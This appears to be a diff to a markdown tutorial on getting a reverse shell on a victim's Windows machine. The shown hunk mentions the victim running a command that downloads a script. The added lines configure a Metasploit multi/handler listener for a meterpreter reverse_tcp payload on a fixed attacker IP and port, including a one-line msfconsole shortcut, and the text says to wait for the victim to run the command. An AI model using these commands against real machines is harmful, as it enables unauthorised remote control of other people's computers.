@@ -55,17 +55,17 @@ On victim's machine we will just neet do run this command, It donwloades the scr
 ## Attacker machine
 
 We will need to start up the listener with *msfconsole* to catch anything that come through:
-> msfconsole
 
-> use exploit/multi/handler
+        > msfconsole
+        > use exploit/multi/handler
+        > set payload windows/x64/meterpreter/reverse_tcp
+        > set LHOST 192.168.1.102
+        > set LPORT 4444
+        > exploit
 
-> set payload windows/x64/meterpreter/reverse_tcp
+Or we can use this shortcut:
 
-> set LHOST 192.168.1.102
-
-> set LPORT 4444
-
-> exploit
+        msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.1.102; set lport 4444; set ExitOnSession false; exploit -j"
 
 Now we just wait for the victim to issue the command:
         
